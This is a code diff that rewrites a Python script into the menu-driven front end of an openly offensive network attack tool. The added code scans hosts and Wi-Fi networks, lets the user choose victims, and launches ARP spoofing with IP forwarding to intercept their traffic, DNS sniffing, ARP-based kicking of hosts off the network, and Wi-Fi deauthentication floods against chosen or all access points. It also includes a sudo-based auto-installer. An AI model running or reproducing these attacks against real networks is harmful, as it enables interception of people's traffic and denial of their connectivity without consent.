@@ -1,6 +1,18 @@
 #!/usr/bin/env python3
 
-RED = "\033[1;31m"
+# imports that won't cause errors
+import sys
+import os
+import signal
+import subprocess
+from threading import Thread
+from time import sleep
+import datetime
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # scapy, please shut up..
+
+# terminal colors
+RED = "\033[1;31m"  
 BLUE = "\033[1;34m"
 CYAN = "\033[1;36m"
 GREEN = "\033[1;32m"
@@ -8,128 +20,569 @@ YELLOW = "\33[1;93m"
 NORMAL = "\033[0;0m"
 BOLD = "\033[;1m"
 
-def print_banner():
-    print("{Y}    _   _________________  _______________   ________ __{R}  _ _ _ \n" \
-          "{Y}   / | / / ____/_  __/   |/_  __/_  __/   | / ____/ //_/{R} / / / / \n" \
-          "{Y}  /  |/ / __/   / / / /| | / /   / / / /| |/ /   / ,<   {R}/ / / /\n" \
-          "{Y} / /|  / /___  / / / ___ |/ /   / / / ___ / /___/ /| |{R} / / / / \n" \
-          "{Y}/_/ |_/_____/ /_/ /_/  |_/_/   /_/ /_/  |_\____/_/ |_|{R}/_/_/_/{N}\n" \
-          "                   {R}b y   c h r i z a t o r{N}\n\n".format(Y=YELLOW, N=NORMAL, R=RED))
+def auto_installer():
+    '''
+    Just installing required modules
+    if they do not already exist
+    '''
+    print("{R}ERROR: Modules missing.{N}".format(R=RED, N=NORMAL))
+    inst = input("Do you want to automatically install all requirements? (y/n): ").lower()
 
-def print_options():
-    print("{Y}SCANNING                      {Y}DEAUTHING\n" \
-          "{N}[{R}1{N}]  Host Scan                {N}[{R}6{N}]  Deauth Access-Point(s)\n" \
-          "{N}[{R}2{N}]  Advanced Host Scan       {N}[{R}7{N}]  Deauth All Access-Points\n" \
-          "{N}[{R}3{N}]  Access-Point Scan\n" \
-          "                              {Y}KICKING\n" \
-          "{Y}SPOOFING/SNIFFING             {N}[{R}8{N}]  Kick Hosts (ARP-Spoof)\n" \
-          "{N}[{R}4{N}]  ARP Spoofing\n" \
-          "{N}[{R}5{N}]  DNS Sniffing\n\n\n" \
-          "Type {R}'help'{N} to get detailed informations.".format(Y=YELLOW, R=RED, N=NORMAL))
+    if inst in ('y', 'yes'):
+        print("[{Y}*{N}] Installing requirements, please stand by...".format(Y=YELLOW, N=NORMAL))
+        subprocess.call("sudo -H apt-get install wireless-tools -y > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo -H apt-get install python3.6-dev libmysqlclient-dev build-essential python-dev libnetfilter-queue-dev -y > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo -H apt-get install python3-pip -y > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo -H apt-get install python3-netifaces -y", shell=True)
+        subprocess.call("sudo -H apt-get install python3-scapy -y > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo wget https://xael.org/norman/python/python-nmap/python-nmap-0.4.1.tar.gz && tar xvzf python-nmap-0.4.1.tar.gz && cd python-nmap-0.4.1 && python setup.py install > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo -H python3 -m pip install netfilterqueue > {}".format(os.devnull), shell=True)
+        subprocess.call("sudo -H python3 -m pip install logging > {}".format(os.devnull), shell=True)
+        sys.exit("\n[{G}+{N}] Requirements installed.\n".format(G=GREEN, N=NORMAL))
+    elif inst in ('n', 'no'):
+        print('F you then.')
+        sys.exit(0)
+    else:
+        sys.exit(0)
 
-def print_help():
-    print("""
-------------
-| SCANNING |
-------------
+'''
+Usually modules that need to be installed
+'''
+try:
+    import netifaces
+    from scapy.all import *
+    import netfilterqueue
+    import nmap
+except ImportError:
+    auto_installer()
 
-  -> Host Scan
-     ---------
-     It will search your network for online hosts using python-nmap. It prints out
-     MAC, IP, Hostaname and Vendor Informations for each host found.
+from src import *
+def get_option():
+    '''
+    Handling the user's input
+    '''
+    while True:
+        raw_option = input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
+        if raw_option == "help" or raw_option == "exit":
+            return raw_option
 
-  -> Advanced Host Scan
-     ------------------
-     It does basically the same as the Host Scan, but collects more detailed informations such as
-     Operating System and Open Ports.
+        try:
+            option = int(raw_option)
+        except ValueError:
+            print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
+            continue
 
-  -> Wifi Scan
-     ---------
-     This obviously scans your area for available WiFi-Networks by sniffing for beacon frames.
-     The following informations will be extracted from the beacon frame:
-     ESSID, BSSID, Encryption Type, Channel, WPS and Signal Strength
+        if 0 < option <= 12:
+            return option
+        else:
+            print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
+            continue
 
------------
-| KICKING |
------------
+def handle_option(option):
+    '''
+    Assgning functions depending on what the user chose
+    '''
+    if option == 1:
+        host_scan(False)
+    if option == 2:
+        host_scan(True)
+    if option == 3:
+        wifi_scan()
+    if option == 4:
+        arp_spoof()
+    if option == 5:
+        dns_sniff()
+    if option == 6:
+        deauth_attack()
+    if option == 7:
+        deauth_all_attack()
+    if option == 8:
+        arp_kick()
+    if option == "help":
+        printings.print_help()
+        printings.print_options()
+        get_option()
+    if option == "exit":
+        sys.exit()
+        clear_screen()
 
-  -> Kick Hosts
-     ----------
-     This will ARP-Spoof your targets (ARP-Spoofing is explained below) but disable
-     IP-Forwarding. So the packets sent by the targets won't even reach the gateway.
+def clear_screen():
+    '''
+    Simply calling 'clear'''
+    subprocess.call("sudo clear", shell=True)
 
------------------------
-| SPOOFING / SNIFFING |
------------------------
+def get_interface():
+    clear_screen()
 
-  -> ARP-Spoofing
-     ------------
-     ARP-Packets will be sent to your targets and your gateway with wrong informations.
-     Your targets traffic will be redirected to you and afterwards to the gateway.
+    print("{Y}Select a suitable network interface:\n{N}".format(Y=YELLOW, N=NORMAL))
 
-  -> DNS-Sniffing
-     ------------
-     It performs a simple ARP-Spoofing attack and filters out DNS-Queries.
+    available_interfaces = netifaces.interfaces()
 
--------------
-| DEAUTHING |
--------------
+    for x in range(len(available_interfaces)):
+        print("   {N}[{R}{num}{N}] {iface}".format(N=NORMAL, R=RED, num=x+1, iface=available_interfaces[x]))
 
-  -> Deauth Access-Points
-     --------------------
-     Deauthentication frames will be sent to the selected Access-Points, which
-     will disconnect the users wirelessly connected to the Access-Point.
+    print("\n")
 
-  -> Deauth All Access-Points
-     ------------------------
-     It basically does the same as the Deauth Access-Points option, but
-     it will Deauth every found Access-Point. After 120 seconds, a rescan
-     will automatically happen.\n""")
+    while True:
+        raw_interface = input("{N}#{R}>{N} ".format(N=NORMAL, R=RED))
+
+        try:
+            interface = int(raw_interface)
+        except ValueError:
+            print("{R}ERROR: Please enter a number.{N}".format(R=RED, N=NORMAL))
+            continue
+
+        if 0 < interface <= len(available_interfaces):
+            return available_interfaces[interface-1]
+        else:
+            print("{R}ERROR: Wrong number.{N}".format(R=RED, N=NORMAL))
+
+def enable_mon_mode(interface):
+    # enable monitoring mode to capture and send packets
+
+    #try:
+    subprocess.call("sudo ip link set {} down".format(interface), shell=True)
+    mon = subprocess.Popen(["sudo", "iwconfig", interface, "mode", "monitor"], stderr=subprocess.PIPE)
+
+    subprocess.call("sudo ip link set {} up".format(interface), shell=True)
+    #except Exception:
+    #    sys.exit("\n{R}ERROR: The selected interface can't be used or not able to activate monitor mode on selected interface.{N}\n".format(R=RED, N=NORMAL))
+
+def enable_ip_forwarding():
+    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipfwd.write('1\n')
+    ipfwd.close()
+
+def disable_ip_forwarding():
+    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+    ipfwd.write('0\n')
+    ipfwd.close()
+
+def get_gateway_ip():
+    # get the 'default' gateway
+
+    try:
+        return netifaces.gateways()['default'][netifaces.AF_INET][0]
+    except KeyError:
+        print("\n{R}ERROR: Unable to retrieve gateway IP address.\n{N}".format(R=RED, N=NORMAL))
+        return input("Please enter gateway IP address manually: ")
+
+def get_local_ip(interface):
+    try:
+        local_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
+        if local_ip == "127.0.0.1" or local_ip == "ff:ff:ff:ff:ff:ff":
+            sys.exit("\n{R}ERROR: Invalid network interface.{N}\n".format(R=RED, N=NORMAL))
+        return local_ip
+    except KeyError:
+        print("\n{R}ERROR: Unable to retrieve local IP address.{N}\n")
+        return input("Please enter your local IP address manually: ")
+
+def get_mac_by_ip(ipaddr):
+    # get the MAC by sending ARP packets to the desired IP
+
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipaddr), retry=2, timeout=7)
+    for snd, rcv in ans:
+        try:
+            return rcv[Ether].src
+        except KeyError:
+            print("\n{R}ERROR: Unable to retrieve MAC address from IP address: {N}{ip}\n".format(R=RED, N=NORMAL, ip=ipaddr))
+            return input("Please enter MAC address manually: ")
+
+def host_scan(advanced_scan=False):
+    '''
+    This searches for hosts in the network using python-nmap.
+    Informations like: IP, MAC, Vendor, OS and open ports can be gathered.
+    The function uses 'scan.py' located in the local 'build' folder.
+    '''
+
+    interface = get_interface()
+    
+    hostscan = scan.HostScan(interface)
+    ip_range = hostscan.get_range()
+
+    if advanced_scan:
+        hostscan.advanced_scan = True
+
+    clear_screen()
+    
+    print("{N}The following IP range will be scanned with NMAP: {G}{ipr}{N}".format(G=GREEN, N=NORMAL, ipr=ip_range))
+    print("Press {Y}'Enter'{N} to agree or enter your custom IP range.".format(Y=YELLOW, N=NORMAL))
+    ipr_change = input("{N}#{R}>{N} ".format(N=NORMAL, R=RED))
+    if ipr_change:
+        ip_range = ipr_change
+    
+    clear_screen()
+
+    if advanced_scan:
+        # print a different message, since the advanced scan can take up to several minutes
+        print("[{Y}*{N}] Scanning the network. This will take some time.".format(Y=YELLOW, N=NORMAL))
+    else:
+        print("[{Y}*{N}] Scanning the network...".format(Y=YELLOW, N=NORMAL))
+        
+    hostscan.do_scan(ip_range)
+    hosts = hostscan.get_hosts()
+
+    clear_screen()
+    printings.host_scan()
+
+    for mac in hosts:
+        # print out gathered informations for each host in the network
+
+        print("<<<-----------------------   {Y}{ip}{N}   ----------------------->>>\n".format(Y=YELLOW, N=NORMAL, ip=hosts[mac]["ip"]))
+
+        if hosts[mac]["gateway"]:
+            print("{R}IP:{N}      {Y}{ip} {R}(gateway){N}\n{R}MAC:{N}     {mac}\n{R}Name:{N}    {name}\n{R}Vendor:{N}  {vendor}".format(
+                R=RED,
+                N=NORMAL,
+                Y=YELLOW,
+		ip=hosts[mac]['ip'],
+            	mac=mac.upper(),
+            	vendor=hosts[mac]['vendor'],
+            	name=hosts[mac]['name']))
+        else:
+            print("{R}IP:{N}      {Y}{ip}\n{R}MAC:{N}     {mac}\n{R}Name:{N}    {name}\n{R}Vendor:{N}  {vendor}".format(
+                R=RED,
+            	N=NORMAL,
+	        Y=YELLOW,
+            	ip=hosts[mac]['ip'],
+            	mac=mac.upper(),
+            	vendor=hosts[mac]['vendor'],
+            	name=hosts[mac]['name']))
+
+        if advanced_scan:
+            if not hosts[mac]["os"]:
+                print("{R}OS:{N}      Unknown Operating System\n".format(R=RED, N=NORMAL))
+            else:
+                '''
+                The following dict is created by python-nmap.
+                It really is a mess
+                '''
+                os_list = {}
+		
+                for item in hosts[mac]["os"]:
+                    if not item[0] or not item[1]:
+                        continue
+                    if item[0] in os_list:
+                        if item[1] not in os_list[item[0]]:
+                            os_list[item[0]].append(item[1])
+                    else:
+                        os_list[item[0]] = [item[1]]
+
+                    os_str = "{R}OS:     {N} "
+                    for os in os_list:
+                        os_str += "{} ".format(os)
+                        for gen in os_list[os]:
+                            if gen == os_list[os][-1]:
+                                os_str += "{}\n         ".format(gen)
+                            else:
+                                os_str += "{}/".format(gen)
+
+                    if not os_list:
+                        os_str = "{R}OS:{N}      Unknown Operating System\n".format(R=RED, N=NORMAL)
+
+                print(os_str.format(R=RED, N=NORMAL))
+
+            if not hosts[mac]["open_ports"]:
+                print("{R}Ports:{N}   No open ports".format(R=RED, N=NORMAL))
+            else:
+                open_ports = hosts[mac]["open_ports"]
+                port_str = "{R}Ports:{N}   ".format(R=RED, N=NORMAL)
+                port_len = len(port_str)
+
+                for port in list(open_ports.keys()):
+                    name = open_ports[port]
+                    if not name:
+                        name = "Unkown Port"
+
+                    if port == list(open_ports.keys()):
+                        port_str += "{G}open   {Y}{p}{N} ({name})\n".format(G=GREEN, Y=YELLOW, N=NORMAL, p=port, name=name)
+                    elif port == list(open_ports.keys()):
+                        port_str += "         {G}open   {Y}{p}{N} ({name})".format(G=GREEN, Y=YELLOW, N=NORMAL, p=port, name=name)
+                    else:
+                        port_str += "         {G}open   {Y}{p}{N} ({name})\n".format(G=GREEN, Y=YELLOW, N=NORMAL, p=port, name=name)
+		
+                if port_len == len(port_str):
+                    print("{R}Ports:{N}   No open ports".format(R=RED, N=NORMAL))
+                else:
+                    print(port_str)
+
+        print("\n")
+
+    print("{R}{num}{N} hosts up.\n".format(R=RED, N=NORMAL, num=len(hosts)))
+
+def wifi_scan():
+    '''
+    This will perform a basic Access-Point scan.
+    Informations like WPS, Encryption, Signal Strength, ESSID, ... will be shown for every available AP.
+    The function uses 'scan.py' located in the local 'build' folder.
+    '''
+
+    interface = get_interface()
+    enable_mon_mode(interface)
+
+    wifiscan = scan.WifiScan(interface)
+    wifiscan.do_output = True
+
+    hopT = Thread(target=wifiscan.channelhop, args=[])
+    hopT.daemon = True
+    hopT.start()
+
+    # This decay is needed to avoid issues concerning the Channel-Hop-Thread
+    sleep(0.2)
+    
+    try:
+        wifiscan.do_scan()
+    except socket.error:
+        print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
+        disable_mon_mode(interface)
+        sys.exit(0)
+
+def get_targets_from_hosts(interface):
+    '''
+    This will scan the network for hosts and print them out.
+    It lets you choose the targets for your attack.
+    '''
+
+    targets = {}
+    available_hosts = {}
+    cntr = 1
+
+    hostscan = scan.HostScan(interface)
+    ip_range = hostscan.get_range()
+
+    clear_screen()
+    
+    print("{N}The following IP range will be scanned with NMAP: {G}{ipr}{N}".format(G=GREEN, N=NORMAL, ipr=ip_range))
+    print("Press {Y}'Enter'{N} to agree or enter your custom IP range.".format(Y=YELLOW, N=NORMAL))
+    
+    ipr_change = input("{N}#{R}>{N} ".format(N=NORMAL, R=RED))
+    if ipr_change:
+        ip_range = ipr_change
+    
+    clear_screen()
+    
+    print("[{Y}*{N}] Scanning the network...".format(Y=YELLOW, N=NORMAL))
+    
+    hostscan.do_scan(ip_range)
+    hosts = hostscan.get_hosts()
+    
+    clear_screen()
+    
+    if len(hosts) < 1:
+        print("\n{R}No hosts found :({N}\n".format(R=RED, N=NORMAL))
+        sys.exit(0)
+    
+    print("{Y}Available hosts:{N}\n\n".format(Y=YELLOW, N=NORMAL))
+
+    for mac in list(hosts):
+        if hosts[mac]['gateway']:
+            del hosts[mac]
+            continue
+        else:
+            available_hosts[len(available_hosts)+1] = mac
+            print("   {R}[{N}{ID}{R}] {N}{mac} ({ip}) | {name}".format(
+                R=RED,
+                N=NORMAL,
+                ID=len(available_hosts),
+                mac=mac.upper(),
+                ip=hosts[mac]['ip'],
+                name=hosts[mac]['name']))
+
+    print("\n\nChoose the target(s) seperated by {R}','{N} (comma).\nType {R}'all'{N} to choose everything listed.".format(R=RED, N=NORMAL))
+
+    while True:
+        targets_in = input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
+        targets_in = targets_in.replace(" ", "")
+
+        if targets_in == "all":
+            for mac in hosts:
+                targets[mac] = hosts[mac]["ip"]
+            return targets
+
+        if "," in targets_in:
+            targets_list = targets_in.split(",")
+
+            if all(x.isdigit() for x in targets_list) and all(0 < int(y) <= len(available_hosts) for y in targets_list):
+                for target in targets_list:
+                    for num in available_hosts:
+                        if int(target) == num:
+                            targets[available_hosts[num]] = hosts[available_hosts[num]]["ip"]
+                return targets
+            else:
+                print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
+                continue
+        else:
+            if targets_in.isdigit() and 0 < int(targets_in) <= len(available_hosts):
+                targets[available_hosts[int(targets_in)]] = hosts[available_hosts[int(targets_in)]]["ip"]
+                return targets
+            else:
+                print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
+                continue
+
 
 def arp_kick():
-    print("\n  ___   ______  ______            _   ___      _    \n" \
-          " / _ \  | ___ \ | ___ \          | | / (_)    | |   \n" \
-          "/ /_\ \ | |_/ / | |_/ /  ______  | |/ / _  ___| | __\n" \
-          "|  _  | |    /  |  __/  |______| |    \| |/ __| |/ /\n" \
-          "| | | | | |\ \  | |              | |\  \ | (__|   < \n" \
-          "\_| |_/ \_| \_| \_|              \_| \_/_|\___|_|\_\\\n")
+    interface = get_interface()
+    targets = get_targets_from_hosts(interface)
+    gateway_ip = get_gateway_ip()
+    gateway_mac = get_mac_by_ip(gateway_ip)
+    local_ip = get_local_ip(interface)
+    
+    arpspoof = spoof.ARPSpoof(targets, gateway_ip, gateway_mac, interface)
+
+    printings.arp_kick()
+
+    for mac in targets:
+        print("{G} ->{N}  {mac} ({ip})".format(G=GREEN, N=NORMAL, mac=mac.upper(), ip=targets[mac]))
+
+    disable_ip_forwarding()
+
+    try:
+        arpspoof.arp_spoof()
+    except:
+        print("\n{R}RESTORING TARGETS. PLEASE STAND BY!{N}".format(R=RED, N=NORMAL))
+        arpspoof.restore_arp()
+
+def arp_spoof():
+    interface = get_interface()
+    targets = get_targets_from_hosts(interface)
+    gateway_ip = get_gateway_ip()
+    gateway_mac = get_mac_by_ip(gateway_ip)
+
+    arpspoof = spoof.ARPSpoof(targets, gateway_ip, gateway_mac, interface)
+
+     #printings.arp_spoof()
+
+    for mac in targets:
+        print(" {G}->{N}  {mac} ({ip})".format(G=GREEN, N=NORMAL, mac=mac.upper(), ip=targets[mac]))
+
+    enable_ip_forwarding()
+
+    try:
+        arpspoof.arp_spoof()
+    except:
+        print("\n{R}RESTORING TARGETS. PLEASE STAND BY!{N}".format(R=RED, N=NORMAL))
+        arpspoof.restore_arp()
 
 def dns_sniff():
-    print("______   _   _   _____            _____       _  __  __ \n" \
-          "|  _  \ | \ | | /  ___|          /  ___|     (_)/ _|/ _|\n" \
-          "| | | | |  \| | \ `--.   ______  \ `--. _ __  _| |_| |_ \n" \
-          "| | | | | . ` |  `--. \ |______|  `--. \ '_ \| |  _|  _|\n" \
-          "| |/ /  | |\  | /\__/ /          /\__/ / | | | | | | |  \n" \
-          "|___/   \_| \_/ \____/           \____/|_| |_|_|_| |_|  \n")
+    interface = get_interface()
+    targets = get_targets_from_hosts(interface)
+    gateway_ip = get_gateway_ip()
+    gateway_mac = get_mac_by_ip(gateway_ip)
+    local_ip = get_local_ip(interface)
 
-def ap_scan():
-    print("  ___   ______            _____                 \n" \
-          " / _ \  | ___ \          /  ___|                \n" \
-          "/ /_\ \ | |_/ /  ______  \ `--.  ___ __ _ _ __  \n" \
-          "|  _  | |  __/  |______|  `--. \/ __/ _` | '_ \ \n" \
-          "| | | | | |              /\__/ / (_| (_| | | | |\n" \
-          "\_| |_/ \_|              \____/ \___\__,_|_| |_|\n\n")
+    enable_ip_forwarding()
+    
+    arpspoof = spoof.ARPSpoof(targets, gateway_ip, gateway_mac, interface)
+    dnssniff = sniff.DNSSniff(local_ip, interface)
 
-def host_scan():
-    print(" _   _           _     _____                 \n" \
-          "| | | |         | |   /  ___|                \n" \
-          "| |_| | ___  ___| |_  \ `--.  ___ __ _ _ __  \n" \
-          "|  _  |/ _ \/ __| __|  `--. \/ __/ _` | '_ \ \n" \
-          "| | | | (_) \__ \ |_  /\__/ / (_| (_| | | | |\n" \
-          "\_| |_/\___/|___/\__| \____/ \___\__,_|_| |_|\n\n")
+    spoofT = Thread(target=arpspoof.arp_spoof, args=[])
+    spoofT.daemon = True
+    spoofT.start()
 
-def deauth_ap():
-    print("______                 _   _        ___  ______ \n" \
-          "|  _  \               | | | |      / _ \ | ___ \\\n" \
-          "| | | |___  __ _ _   _| |_| |__   / /_\ \| |_/ /\n" \
-          "| | | / _ \/ _` | | | | __| '_ \  |  _  ||  __/ \n" \
-          "| |/ /  __/ (_| | |_| | |_| | | | | | | || |    \n" \
-          "|___/ \___|\__,_|\__,_|\__|_| |_| \_| |_/\_|    \n")
+    clear_screen()
+    printings.dns_sniff()
+    print("\n[{Y}*{N}] Listening for DNS packets...\n".format(Y=YELLOW, N=NORMAL))
+    
+    try:
+        dnssniff.dns_sniff()
+    except:
+        print("\n{R}RESTORING TARGETS. PLEASE STAND BY!{N}".format(R=RED, N=NORMAL))
+        arpspoof.restore_arp()
+        disable_ip_forwarding()
+        
+def deauth_attack():
+    interface = get_interface()
+    enable_mon_mode(interface)
 
-def deauth_all():
-    print("______                 _   _            ___  _ _ \n" \
-          "|  _  \               | | | |          / _ \| | |\n" \
-          "| | | |___  __ _ _   _| |_| |__ ______/ /_\ \ | |\n" \
-          "| | | / _ \/ _` | | | | __| '_ \______|  _  | | |\n" \
-          "| |/ /  __/ (_| | |_| | |_| | | |     | | | | | |\n" \
-          "|___/ \___|\__,_|\__,_|\__|_| |_|     \_| |_/_|_|\n")
+    wifiscan = scan.WifiScan(interface)
+    wifiscan.do_output = False
+    wifiscan.timeout = 8
+
+    hopT = Thread(target=wifiscan.channelhop, args=[])
+    hopT.daemon = True
+    hopT.start()
+
+    clear_screen()
+    print("[{Y}*{N}] Searching for WiFi-Networks... (10 sec.)\n".format(Y=YELLOW, N=NORMAL))
+
+    wifiscan.do_scan()
+    wifiscan.channelhop_active = False
+    access_points = wifiscan.get_access_points()
+
+    if len(access_points) < 1:
+        print("{R}No networks found :({N}".format(R=RED, N=NORMAL))
+        sys.exit(0)
+
+    print("{Y}Available networks:{N}\n".format(Y=YELLOW, N=NORMAL))
+
+    num = 1
+    for bssid in access_points.keys():
+        space = 2
+        if num > 9:
+            space = 1
+
+        essid = access_points[bssid]["essid"]
+        access_points[bssid]["num"] = num
+        print("   [{R}{num}{N}]{sp}{bssid} | {essid}".format(num=num, R=RED, N=NORMAL, bssid=bssid.upper(), essid=essid, sp=" "*space))
+
+        num += 1
+    
+    print("\nSeperate multiple targets with {R}','{N} (comma).".format(R=RED, N=NORMAL))
+
+    while True:
+        ap_in = input("#{R}>{N} ".format(R=RED, N=NORMAL))
+        ap_in = ap_in.replace(" ", "")
+
+        if not "," in ap_in:
+            ap_list_in = [ap_in]
+        else:
+             ap_list_in = ap_in.split(",")
+
+        if not all(x.isdigit() for x in ap_list_in) or not all(int(x) in range(len(access_points)+1) for x in ap_list_in):
+            print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
+            continue
+
+        break
+
+    clear_screen()
+    printings.deauth_ap()
+
+    ap_list = {}
+
+    for bssid in access_points:
+        for num in ap_list_in:
+            if int(num) == access_points[bssid]["num"]:
+                print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
+                ap_list[bssid] = access_points[bssid]["ch"]
+
+    print("\n")
+
+    deauthent = deauth.Deauth(ap_list, interface)
+    deauthent.start_deauth()
+
+def deauth_all_attack():
+    interface = get_interface()
+    enable_mon_mode(interface)
+
+    deauthent_all = deauth.DeauthAll(interface)
+    deauthent_all.start_deauth_all()
+
+def main():
+    # Signal handler to catch KeyboardInterrupts
+    def signal_handler(signal, frame):
+        print("")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+
+    conf.verb = 0 # scapy, QUITE
+
+    clear_screen()
+    printings.print_banner()
+    printings.print_options()
+
+    option = get_option()
+    handle_option(option)
+
+if __name__ == "__main__":
+    main()
